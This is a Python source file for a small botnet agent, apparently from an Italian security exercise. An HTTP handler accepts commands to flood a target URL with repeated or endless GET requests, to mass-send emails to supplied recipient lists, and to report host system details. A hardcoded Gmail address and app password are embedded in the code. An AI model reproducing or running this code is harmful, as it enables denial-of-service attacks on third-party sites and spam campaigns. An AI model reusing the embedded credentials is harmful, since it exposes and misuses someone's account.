import json
import platform
import smtplib
import ssl
import threading
from email.mime.text import MIMEText

import psutil
from http.server import BaseHTTPRequestHandler
import requests


def get_size(bytes, suffix="B"):
    """
    Scale bytes to its proper format
    e.g:
        1253656 => '1.20MB'
        1253656678 => '1.17GB'
    """
    factor = 1024
    for unit in ["", "K", "M", "G", "T", "P"]:
        if bytes < factor:
            return f"{bytes:.2f}{unit}{suffix}"
        bytes /= factor


class HTTPServerRH(BaseHTTPRequestHandler):
    target = ""
    action = "waiting"
    event = threading.Event()
    smtp_server = "smtp.gmail.com"
    port = 465
    password = "cebqshlncuewhjso"
    sender = "botnetsicurezza@gmail.com"
    context = ssl.create_default_context()

    def log_message(self, format, *args):
       return

    def do_GET(self):
        if self.path == "/status":
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            message = {"target": self.target, "action": self.action}
            self.wfile.write(json.dumps(message).encode('utf-8'))
            return
        if self.path == "/stopAttack":
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.event.set()
            self.target = ""
            self.action = "waiting"
            message = {"target": self.target, "action": self.action}
            self.wfile.write(json.dumps(message).encode('utf-8'))
            return
        elif self.path == "/getSystemInfo":
            self.target = ""
            self.action = "System info"
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            try:
                uname = platform.uname()
                svmem = psutil.virtual_memory()
                partition = psutil.disk_partitions()
                message = {
                    "System": uname.system,
                    "Node name": uname.node,
                    "Release": uname.release,
                    "Version": uname.version,
                    "Machine": uname.machine,
                    "Processor": platform.processor(),
                    "Physical cores": psutil.cpu_count(logical=False),
                    "Total cores": psutil.cpu_count(logical=True),
                    "Memory": get_size(svmem.total),
                }
                self.wfile.write(json.dumps(message).encode('utf-8'))
            except Exception as e:
                print(e)
                pass
            return

    def do_POST(self):
        if self.path == "/doGet":
            contentLength = int(self.headers['Content-Length'])
            postData = self.rfile.read(contentLength).decode("utf-8")
            req = json.loads(postData)
            self.target = req["url"]
            self.action = "Get " + str(req["time"]) + " times"
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            try:
                p = threading.Thread(target=self.doRequest, args=(req["url"], int(req["time"])))
                p.daemon = True
                p.start()
            except Exception as e:
                print(e)
            message = {"target": self.target, "action": self.action}
            self.wfile.write(json.dumps(message).encode('utf-8'))
            return
        if self.path == "/sendEmail":
            contentLength = int(self.headers['Content-Length'])
            postData = self.rfile.read(contentLength).decode("utf-8")
            data = json.loads(postData)
            self.target = len(data['utenti'])
            self.action = "Sending email to " + str(self.target) + " users"
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            try:
                p = threading.Thread(target=self.sendEmail, args=(data['oggetto'], data['messaggio'], data['utenti']))
                p.daemon = True
                p.start()
            except Exception as e:
                print(e)
            message = {"target": self.target, "action": self.action}
            self.wfile.write(json.dumps(message).encode('utf-8'))
            return

    def doRequest(self, url, time):
        i = 0
        while (i < time or time == -1) and not self.event.is_set():
            try:
                response = requests.get(url)
            except Exception as e:
                print("Request error: ", e)
            if time != -1:
                i += 1
        self.event.clear()

    def sendEmail(self, oggetto, message, utenti):
        try:
            with smtplib.SMTP_SSL(self.smtp_server, self.port, context=self.context) as server:
                server.login(self.sender, self.password)
                msg = MIMEText(message)
                msg['Subject'] = oggetto
                msg['Form'] = self.sender
                for u in utenti:
                    msg['To'] = u
                    server.sendmail(self.sender, u, msg.as_string())
        except Exception as e:
            print(e)
